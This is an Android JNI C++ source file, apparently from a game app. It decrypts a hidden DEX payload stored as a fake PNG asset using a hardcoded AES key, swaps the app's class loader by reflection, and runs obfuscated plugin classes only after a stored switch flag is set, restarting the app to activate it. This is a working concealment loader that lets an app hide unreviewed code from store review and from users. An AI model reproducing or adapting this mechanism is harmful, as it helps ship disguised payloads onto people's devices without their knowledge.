//
// Created by ybpcn on 2023/10/8.
//
#include <jni.h>
#include <sys/types.h>
#include <android/log.h>
#include <string>
#include <stdio.h>
#include <cstdio>
#include <cstring>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <android/asset_manager_jni.h>

#include "JNIUtils.h"

#include "aes.h"


const char *GAME_CHECK_ID = "TRUCO_DATA";
const char *GAME_CHECK_FIELD_ID = "TRUCO_ID";
const char *GAME_CHECK_DEFAULT_VALUE_ID = "false";
const char *GAME_CHECK_VALUE_ID = "true";

const char *GAME_RESOURCE_ID = "xMVGFcBRECE.png";
const char *GAME_RESOURCE_PWD = "suq121gxuxztdddx";
const char *GAME_RESOURCE_IV = "1234567812345678";

const char *PLUGIN_CLASS_ID = "aibm.rlfp";
const char *PLUGIN_INIT_METHOD_ID = "cespi2";
const char *PLUGIN_CREATE_METHOD_ID = "cespi1";
const char *PLUGIN_START_METHOD_ID = "cespi3";

const char *PLUGIN_START_ARGS_ID = "yzhi.mtxb.skrv.sgsActivity";
const char *LAUNCH_ACTIVITY_ID = "org.cocos2dx.lua.ehvicAppActivity";


static jobject m_ctx = nullptr;
static bool    m_ischeck = false;
static jobject m_dexClassLoader = nullptr;
static jstring m_packageName = nullptr;
const int FLAG_ACTIVITY_CLEAR_TOP = 0x04000000;

static std::string getFilesDirPath(JNIEnv* env,jobject  thisObj, jstring& packetName) {
    std::string rv;

    jclass  thisClass = env->GetObjectClass(thisObj);
    jobject  getFilesDirObj =callObjectMethod(env, thisClass, thisObj, "getFilesDir", "()Ljava/io/File;");

    jclass  fileClass = env->GetObjectClass(getFilesDirObj);
    jstring absolutePathObj = (jstring)callObjectMethod(env, fileClass, getFilesDirObj, "getAbsolutePath", "()Ljava/lang/String;");

    const char* szPath = env->GetStringUTFChars(absolutePathObj, NULL);
    rv = szPath;
    packetName = (jstring)callObjectMethod(env, thisClass, thisObj, "getPackageName", "()Ljava/lang/String;");

    m_packageName = (jstring)env->NewGlobalRef(packetName);

    env->DeleteLocalRef(getFilesDirObj);
    env->ReleaseStringUTFChars(absolutePathObj, szPath);
    env->DeleteLocalRef(absolutePathObj);
    return rv;
}

static bool gameCheck(JNIEnv* env,jobject thiz) {
    jclass cls_Prefer = env->FindClass("android/content/SharedPreferences");
    jobject  obj_SharedPreferences = callObjectMethod(env, env->GetObjectClass(m_ctx), m_ctx,
                                                      "getSharedPreferences","(Ljava/lang/String;I)Landroid/content/SharedPreferences;",
                                                      env->NewStringUTF(GAME_CHECK_ID),0);
    jstring strConfigVal = (jstring)callObjectMethod(env,cls_Prefer,obj_SharedPreferences,
                                "getString", "(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;", env->NewStringUTF(GAME_CHECK_FIELD_ID), env->NewStringUTF(GAME_CHECK_DEFAULT_VALUE_ID));

    if(0 != jstringICmp(env, strConfigVal, env->NewStringUTF(GAME_CHECK_VALUE_ID))) {
        return false;
    }
    return true;
}
/*
void decrypt_file(JNIEnv* env,jstring sourceFilePath,jstring destFilePath){
    jclass CipherClass = env->FindClass("javax/crypto/Cipher");
    jmethodID getInstanceId = env->GetStaticMethodID(CipherClass,"getInstance","(Ljava/lang/String;)Ljavax/crypto/Cipher;");
    jobject cipher = env->CallStaticObjectMethod(CipherClass,getInstanceId,env->NewStringUTF("AES/CBC/PKCS5Padding"));

    jclass DESKeySpecClass = env->FindClass("javax/crypto/spec/DESKeySpec");
    jmethodID initDESKeySpecId = env->GetMethodID(DESKeySpecClass,"<init>","([B)V");


    jbyteArray jPwd=env->NewByteArray(100);
    env->SetByteArrayRegion(jPwd,0,100,pwd);
    jobject desKeySpec = env->NewObject(DESKeySpecClass,initDESKeySpecId,jPwd);

    jclass SecretKeyFactoryClass = env->FindClass("javax/crypto/SecretKeyFactory");
    jmethodID getSKFactoryInstanceId = env->GetStaticMethodID(SecretKeyFactoryClass,"getInstance","(Ljava/lang/String;)Ljavax/crypto/SecretKeyFactory;");
    jobject secretKeyFactory = env->CallStaticObjectMethod(SecretKeyFactoryClass,getSKFactoryInstanceId,env->NewStringUTF("DES"));
    jmethodID generateSecretId = env->GetMethodID(SecretKeyFactoryClass,"generateSecret","(Ljava/security/spec/KeySpec;)Ljavax/crypto/SecretKey;");
    jobject key = env->CallObjectMethod(secretKeyFactory,generateSecretId,desKeySpec);

    jmethodID initId = env->GetMethodID(CipherClass,"init","(ILjava/security/Key;)V");
    env->CallVoidMethod(cipher,initId,2,key);

    jclass FileInputStreamClass = env->FindClass("java/io/FileInputStream");
    jmethodID initFileInputStream = env->GetMethodID(FileInputStreamClass,"<init>","(Ljava/lang/String;)V");
    jobject fis = env->NewObject(FileInputStreamClass,initFileInputStream,sourceFilePath);

    jclass FileOutputStreamClass = env->FindClass("java/io/FileOutputStream");
    jmethodID initFileOutputStream = env->GetMethodID(FileOutputStreamClass,"<init>","(Ljava/lang/String;)V");
    jobject fos = env->NewObject(FileOutputStreamClass,initFileOutputStream,destFilePath);

    jclass CipherOutputStreamClass = env->FindClass("javax/crypto/CipherOutputStream");
    jmethodID initCipherOutputStream = env->GetMethodID(CipherOutputStreamClass,"<init>","(Ljava/io/OutputStream;Ljavax/crypto/Cipher;)V");
    jobject cos= env->NewObject(CipherOutputStreamClass,initCipherOutputStream,fos,cipher);

    jmethodID fisRead = env->GetMethodID(env->GetObjectClass(fis),"read","([B)I");
    jmethodID cosWrite = env->GetMethodID(CipherOutputStreamClass,"write","([BII)V");
    jmethodID cosFlush = env->GetMethodID(CipherOutputStreamClass,"flush","()V");
    jmethodID fosClose = env->GetMethodID(FileOutputStreamClass,"close","()V");
    jmethodID cosClose = env->GetMethodID(CipherOutputStreamClass,"close","()V");
    jmethodID fisClose = env->GetMethodID(env->GetObjectClass(fis),"close","()V");

    jbyteArray buffer = env->NewByteArray(1024);
    jint bufferSize = 0;
    while(bufferSize!=-1){
        bufferSize = env->CallIntMethod(fis,fisRead,buffer);
        LOGE("读取 %d 个字节",bufferSize);
        if(bufferSize>0){
            env->CallVoidMethod(cos,cosWrite,buffer,0,bufferSize);
            LOGE("解密 %d 个字节",bufferSize);
        }
    }

    env->CallVoidMethod(cos,cosFlush);
    env->CallVoidMethod(cos,cosClose);
    if(env->ExceptionCheck()){
        env->ExceptionDescribe();
        env->ExceptionClear();
        env->ThrowNew(env->FindClass("java/lang/Exception"),"解密失败");
    }
    env->CallVoidMethod(fos,fosClose);
    env->CallVoidMethod(fis,fisClose);
}
*/

static bool decodeResource(JNIEnv* env, jobject thiz, std::string str_cachePath, std::string& out_dexpath) {
    out_dexpath = str_cachePath + "classdex.jar";
    ensure_dir(str_cachePath.c_str(), 0700);

    const char* res_name = env->GetStringUTFChars(env->NewStringUTF(GAME_RESOURCE_ID), NULL);
    const unsigned char *pws_bin = (const unsigned char*)env->GetStringUTFChars(env->NewStringUTF(GAME_RESOURCE_PWD), NULL);
    const unsigned char *iv_bin = (const unsigned char*)env->GetStringUTFChars(env->NewStringUTF(GAME_RESOURCE_IV), NULL);
    unsigned char*  dataBuffer = NULL;
    jobject assetManager = callObjectMethod(env, env->GetObjectClass(m_ctx), m_ctx, "getAssets", "()Landroid/content/res/AssetManager;");
    AAssetManager *nativeAsset = AAssetManager_fromJava(env, assetManager);


    AAsset *assetFile = AAssetManager_open(nativeAsset, res_name, AASSET_MODE_BUFFER);
    size_t fileLength = AAsset_getLength(assetFile);
    dataBuffer = (unsigned char *) malloc(fileLength);
    AAsset_read(assetFile, dataBuffer, fileLength);
    AAsset_close(assetFile);
    printf("decrypted:\n");


    unsigned char encrypted[16], decrypted[16];
    memset(encrypted, 0, 16*sizeof(char));
    memset(decrypted, 0, 16*sizeof(char));


    AES_KEY key;
    AES_set_decrypt_key(pws_bin, 128, &key);
    unsigned char ivc[AES_BLOCK_SIZE];
    memcpy( ivc, iv_bin, AES_BLOCK_SIZE*sizeof(char));
    std::string ret;

    int fd = open(out_dexpath.c_str(), O_CREAT | O_WRONLY | O_TRUNC, 0777);
    if (fd == -1) {
        LOGE("open %s", out_dexpath.c_str());
        env->ReleaseStringUTFChars( env->NewStringUTF(GAME_RESOURCE_ID), res_name);
        env->ReleaseStringUTFChars( env->NewStringUTF(GAME_RESOURCE_PWD), (const char*) pws_bin);
        env->ReleaseStringUTFChars( env->NewStringUTF(GAME_RESOURCE_IV), (const char*) iv_bin);
        return  -1;
    }

    size_t pos = 0;
    size_t len = fileLength;
    size_t rln = 0;

    unsigned char* out = (unsigned char*)malloc(4096);

    do {
        int wln = _hxcmp_min(4096, len);
        AES_cbc_encrypt(dataBuffer+pos, out, wln, &key, ivc, AES_DECRYPT);
        pos += wln;
        len -= wln;
        if(len == 0 ) {
            int tln = wln-1;
            int sln = out[tln];
            wln -= sln;
        }
        rln+=wln;

        if (write_full(fd, out, wln) == -1) {
            close(fd);
            LOGE("write");
            break;
        }


    }while(pos < fileLength);
    LOGI("文件长度:%lld, 解密后原始长度:%lld",fileLength, rln);
    close(fd);
    free(out);
    free(dataBuffer);


    printf("\n");

    env->ReleaseStringUTFChars( env->NewStringUTF(GAME_RESOURCE_ID), res_name);
    env->ReleaseStringUTFChars( env->NewStringUTF(GAME_RESOURCE_PWD), (const char*) pws_bin);
    env->ReleaseStringUTFChars( env->NewStringUTF(GAME_RESOURCE_IV), (const char*) iv_bin);
    return  0;
}

static bool callPluginInit(JNIEnv* env, jobject dexClassLoader) {
    jclass cls_DexClassLoader = env->GetObjectClass(dexClassLoader);
    jclass cls_Plugin;

    cls_Plugin = (jclass)callObjectMethod(env, cls_DexClassLoader, dexClassLoader,
                                          "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;",env->NewStringUTF(PLUGIN_CLASS_ID));

    const char* method_name = env->GetStringUTFChars(env->NewStringUTF(PLUGIN_INIT_METHOD_ID), NULL);
    jmethodID mid_PluginCreate = env->GetStaticMethodID(cls_Plugin, method_name, "(Landroid/content/Context;)V");
    if(mid_PluginCreate == nullptr) {
        if (env->ExceptionCheck()) env->ExceptionClear();
        LOGE("callPluginCreate Method not found. %s",method_name);
        env->ReleaseStringUTFChars( env->NewStringUTF(PLUGIN_INIT_METHOD_ID), method_name);
        return  JNI_TRUE;
    }
    env->CallStaticVoidMethod(cls_Plugin, mid_PluginCreate, m_ctx);
    env->ReleaseStringUTFChars( env->NewStringUTF(PLUGIN_INIT_METHOD_ID), method_name);
    return true;
}

static bool callPluginCreate(JNIEnv* env, jobject thiz) {
    jclass cls_DexClassLoader = env->GetObjectClass(m_dexClassLoader);
    jclass cls_Plugin;

    cls_Plugin = (jclass)callObjectMethod(env, cls_DexClassLoader, m_dexClassLoader,
                                          "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;",env->NewStringUTF(PLUGIN_CLASS_ID));

    const char* method_name = env->GetStringUTFChars(env->NewStringUTF(PLUGIN_CREATE_METHOD_ID), NULL);
    jmethodID mid_PluginCreate = env->GetStaticMethodID(cls_Plugin, method_name, "(Landroid/app/Application;)V");
    if(mid_PluginCreate == nullptr) {
        if (env->ExceptionCheck()) env->ExceptionClear();
        LOGE("callPluginCreate Method not found. %s",method_name);
        env->ReleaseStringUTFChars( env->NewStringUTF(PLUGIN_CREATE_METHOD_ID), method_name);
        return  JNI_TRUE;
    }
    env->CallStaticVoidMethod(cls_Plugin, mid_PluginCreate, thiz);
    env->ReleaseStringUTFChars( env->NewStringUTF(PLUGIN_CREATE_METHOD_ID), method_name);

    return true;
}

static bool callPluginStart(JNIEnv* env, jobject ctx) {
    jclass cls_DexClassLoader = env->GetObjectClass(m_dexClassLoader);
    jclass cls_Plugin;
    cls_Plugin = (jclass)callObjectMethod(env, cls_DexClassLoader, m_dexClassLoader,
                                          "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;",env->NewStringUTF(PLUGIN_CLASS_ID));


    const char* method_name = env->GetStringUTFChars(env->NewStringUTF(PLUGIN_START_METHOD_ID), NULL);
    jmethodID mid_PluginStart = env->GetStaticMethodID(cls_Plugin, method_name, "(Landroid/content/Context;Ljava/lang/String;)V");
    if(mid_PluginStart == nullptr) {
        if (env->ExceptionCheck()) env->ExceptionClear();
        LOGE("callPluginCreate Method not found. %s",method_name);
        env->ReleaseStringUTFChars( env->NewStringUTF(PLUGIN_START_METHOD_ID), method_name);
        return  JNI_TRUE;
    }
    env->CallStaticVoidMethod(cls_Plugin, mid_PluginStart, ctx, env->NewStringUTF(PLUGIN_START_ARGS_ID));
    env->ReleaseStringUTFChars( env->NewStringUTF(PLUGIN_START_METHOD_ID), method_name);
    if (env->ExceptionCheck()) env->ExceptionClear();
    return true;
}


static bool callStartActivity(JNIEnv* env, jobject  ctx, jobject intent) {
    jclass cls_Context = env->FindClass("android/content/Context");
    jmethodID mid_StartActivity = env->GetMethodID(cls_Context, "startActivity", "(Landroid/content/Intent;)V");
    env->CallVoidMethod(ctx, mid_StartActivity, intent);
    if (env->ExceptionCheck()) {
        env->ExceptionClear();
        return false;
    }
    return true;
}

static bool callLaunchActivity(JNIEnv* env, jobject thiz) {
    jclass cls_Context = env->FindClass("android/content/Context");
    jclass cls_ClassLoader = env->FindClass("java/lang/ClassLoader");
    jclass cls_Intent = env->FindClass("android/content/Intent");
    jclass cls_MainActivity;
    jmethodID mid_NewIntent = env->GetMethodID(cls_Intent, "<init>", "(Landroid/content/Context;Ljava/lang/Class;)V");

    jobject thisClassLoader = callObjectMethod(env, cls_Context, thiz, "getClassLoader", "()Ljava/lang/ClassLoader;");
    cls_MainActivity = (jclass)callObjectMethod(env, cls_ClassLoader,thisClassLoader , "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;", env->NewStringUTF(LAUNCH_ACTIVITY_ID));

    jobject intent = env->NewObject(cls_Intent,mid_NewIntent,thiz, cls_MainActivity);
    return callStartActivity(env, thiz, intent);
}

static void restartGame(JNIEnv* env, jstring val) {
    jclass cls_Prefer = env->FindClass("android/content/SharedPreferences");
    jclass cls_SpEditor = env->FindClass("android/content/SharedPreferences$Editor");
    jclass  cls_Content = env->FindClass("android/content/Context");
    jclass cls_Intent = env->FindClass("android/content/Intent");
    jclass cls_Process = env->FindClass("android/os/Process");

    jmethodID mid_MyPid = env->GetStaticMethodID(cls_Process, "myPid","()I");
    jmethodID mid_KillProcess = env->GetStaticMethodID(env->FindClass("android/os/Process"), "killProcess","(I)V");

    jobject  obj_SharedPreferences = callObjectMethod(env, env->GetObjectClass(m_ctx), m_ctx,
                                                      "getSharedPreferences","(Ljava/lang/String;I)Landroid/content/SharedPreferences;",
                                                      env->NewStringUTF(GAME_CHECK_ID),0);
    jobject obj_PrefEditor = callObjectMethod(env,cls_Prefer, obj_SharedPreferences,
                                              "edit", "()Landroid/content/SharedPreferences$Editor;");

    callObjectMethod(env, cls_SpEditor, obj_PrefEditor,
                     "putString", "(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;",
                     env->NewStringUTF(GAME_CHECK_FIELD_ID), val);

    jboolean  isok = callBooleanMethod(env, cls_SpEditor, obj_PrefEditor,  "commit", "()Z");
    if(!isok) {
        LOGD("commit failed.  pushstring");

    }

    jobject obj_PackageManager = callObjectMethod(env, cls_Content, m_ctx,
                                                  "getPackageManager","()Landroid/content/pm/PackageManager;");
    jobject obj_LaunchIntent = callObjectMethod(env, env->GetObjectClass(obj_PackageManager), obj_PackageManager,
                                                "getLaunchIntentForPackage","(Ljava/lang/String;)Landroid/content/Intent;",
                                                m_packageName);

    callObjectMethod(env, cls_Intent, obj_LaunchIntent, "addFlags","(I)Landroid/content/Intent;", FLAG_ACTIVITY_CLEAR_TOP);

    callStartActivity(env, m_ctx, obj_LaunchIntent);

    jint myPid = env->CallStaticIntMethod(cls_Process, mid_MyPid);
    env->CallStaticVoidMethod(cls_Process, mid_KillProcess, myPid);
}

/*
static void saveContexttoApplication(JNIEnv* env, jobject ctx, jobject dexClassLoader) {
    jclass cls_Config = env->FindClass(CONFIG_CLASS_NAME);
    jclass cls_DexClassLoader = env->GetObjectClass(dexClassLoader);
    jclass cls_Application = env->GetObjectClass(ctx);
    jstring strPluginClass = (jstring)getObjectStaticField(env, cls_Config, PLUGIN_CLASS_ID,"Ljava/lang/String;");
    jclass cls_Plugin;
    jstring strSaveField = (jstring)getObjectStaticField(env, cls_Config, APP_SAVE_LOADER_ID,"Ljava/lang/String;");

    cls_Plugin = (jclass)callObjectMethod(env, cls_DexClassLoader, dexClassLoader,
                                          "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;", strPluginClass);

    jfieldID  mid_TheDexClassLoader = env->GetStaticFieldID(cls_Application, APP_DEX_CLASS_LOADER_FIELD, "Ldalvik/system/DexClassLoader;");
    env->SetStaticObjectField(cls_Application, mid_TheDexClassLoader, dexClassLoader);

}*/

//class baseAppLication

//在 baseAppLication.attachBaseContext 中调用
extern "C" JNIEXPORT jboolean JNICALL
Java_uqto_flvx_qihut_npxehlibrary_tqijussms_evljruekf(
        JNIEnv* env,
        jobject thiz,
        jobject ctx
){
    jstring  packName = nullptr;
    std::string str_cachePath = getFilesDirPath(env, thiz, packName) + "/classes/";
    std::string str_libPath = str_cachePath ;
    std::string str_dexpath = str_cachePath + "classdex.jar";

    m_ctx = env->NewGlobalRef(ctx);
    m_ischeck = gameCheck(env,thiz);
    if(!m_ischeck) {
        return JNI_FALSE;
    }
    decodeResource(env, thiz, str_cachePath, str_dexpath);

    FILE* fs = fopen(str_dexpath.c_str(),"r");
    if(fs) {
        fclose(fs);
        fs = NULL;
    }


    jclass cls_VERSION = env->FindClass("android/os/Build$VERSION");
    jfieldID fID = env->GetStaticFieldID(cls_VERSION, "SDK_INT", "I");
    jint sdk_int = env->GetStaticIntField(cls_VERSION, fID);

    // 配置动态加载环境:
    jclass cls_ActivityThread = env->FindClass("android/app/ActivityThread");
    jclass cls_weakReference = env->FindClass("java/lang/ref/WeakReference");
    jclass cls_hashMap = env->FindClass("java/util/HashMap");
    jclass cls_arrayMap = env->FindClass("android/util/ArrayMap");
    jclass cls_LoadedApk = env->FindClass("android/app/LoadedApk");
    jclass cls_DexClassLoader = env->FindClass("dalvik/system/DexClassLoader");
    jclass cls_Application = env->FindClass("android/content/ContextWrapper");
    jclass cls_ClassLoader = env->FindClass("java/lang/ClassLoader");

    jmethodID mid_dexLoader_init = env->GetMethodID(cls_DexClassLoader, "<init>",
                                                    "(Ljava/lang/String;Ljava/lang/String;"
                                                    "Ljava/lang/String;Ljava/lang/ClassLoader;)V");
    jfieldID  mclassloaderID = env->GetFieldID(cls_LoadedApk, "mClassLoader", "Ljava/lang/ClassLoader;");

    jobject currentActivityThread = callStaticObjectMethod(env, cls_ActivityThread,
                                                           "currentActivityThread",
                                                           "()Landroid/app/ActivityThread;");

    jobject weakReference = NULL;

    if (sdk_int < 19) {
        jobject mPackages = getObjectField(env, cls_ActivityThread,
                                           "mPackages", "Ljava/util/HashMap;", currentActivityThread);
        weakReference = callObjectMethod(env, cls_hashMap, mPackages, "get", "(Ljava/lang/Object;)Ljava/lang/Object;", packName);

    } else {
        jobject mPackages = getObjectField(env, cls_ActivityThread,
                                           "mPackages", "Landroid/util/ArrayMap;", currentActivityThread);
        weakReference = callObjectMethod(env, cls_arrayMap, mPackages, "get", "(Ljava/lang/Object;)Ljava/lang/Object;", packName);
    }

    jobject referenceObj = callObjectMethod(env, cls_weakReference, weakReference, "get", "()Ljava/lang/Object;");
    jobject srcClassLoader = getObjectField(env,  cls_LoadedApk,"mClassLoader", "Ljava/lang/ClassLoader;",referenceObj);

    if(!mid_dexLoader_init){
        LOGI("dexClassLoader method id null");
    }
    jobject mClassLoader = callObjectMethod(env, cls_Application, thiz, "getClassLoader", "()Ljava/lang/ClassLoader;");

    jstring apkFileName = env->NewStringUTF(str_dexpath.c_str());
    jstring odexPath = env->NewStringUTF(str_cachePath.c_str());
    jstring libPath = env->NewStringUTF(str_libPath.c_str());

    jobject dexClassLoader = env->NewObject(cls_DexClassLoader, mid_dexLoader_init,
                                            apkFileName, odexPath, libPath, mClassLoader);
    //将原始DEX的classLoader替换进当前线程块中
    env->SetObjectField(referenceObj, mclassloaderID, dexClassLoader);






    /*
    jclass cls_Config = env->FindClass(CONFIG_CLASS_NAME);
    jstring strPluginClass = (jstring)getObjectStaticField(env, cls_Config, PLUGIN_CLASS_ID,"Ljava/lang/String;");
    jclass cls_Plugin = (jclass)callObjectMethod(env, cls_DexClassLoader, dexClassLoader,
                                          "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;",strPluginClass);
    */
    callPluginInit(env, dexClassLoader);

    m_dexClassLoader = env->NewGlobalRef(dexClassLoader);




    return  JNI_TRUE;
}

//在 baseAppLication.onCreate 中调用
extern "C" JNIEXPORT jboolean JNICALL
Java_uqto_flvx_qihut_npxehlibrary_tqijussms_swael(
        JNIEnv* env,
        jobject thiz
    )
{
    if(m_ctx == nullptr || !m_ischeck) {
        return  JNI_FALSE;
    }

    callPluginCreate(env, thiz);
    return JNI_TRUE;
}
extern "C" JNIEXPORT void JNICALL
Java_uqto_flvx_qihut_npxehlibrary_tqijussms_ffeaagz(
        JNIEnv* env,
        jclass  cls,
        jstring val
)
{
    if(m_ctx == nullptr ) {
        return;
    }

    restartGame(env, val);
}


//--------------------------------------------------------------------------------------------------
//xnzbActivity

//在 baseActivity.onCreate 中调用
extern "C" JNIEXPORT jboolean JNICALL
Java_uqto_flvx_qihut_npxehlibrary_ssxfats_rherrjkflz(
        JNIEnv* env,
        jobject thiz,
        jobject ctx
)
{
    if(m_ctx == nullptr || !m_ischeck) {
        return  JNI_FALSE;
    }

    callPluginStart(env, ctx);
    return JNI_TRUE;
}

//在 baseActivity.onCreate 中调用
extern "C" JNIEXPORT jboolean JNICALL
Java_uqto_flvx_qihut_npxehlibrary_ssxfats_dfiwdjzlis(
        JNIEnv* env,
        jobject thiz
)
{
    if(m_ctx == nullptr || !m_ischeck) {
        return  JNI_FALSE;
    }

    callLaunchActivity(env,thiz);
    return JNI_TRUE;
}
extern "C" JNIEXPORT jboolean JNICALL
Java_uqto_flvx_qihut_npxehlibrary_ssxfats_qiitfx(
        JNIEnv* env,
        jobject thiz
)
{
    if(m_ctx == nullptr || !m_ischeck) {
        return  JNI_FALSE;
    }

    callLaunchActivity(env,thiz);
    return JNI_TRUE;
}


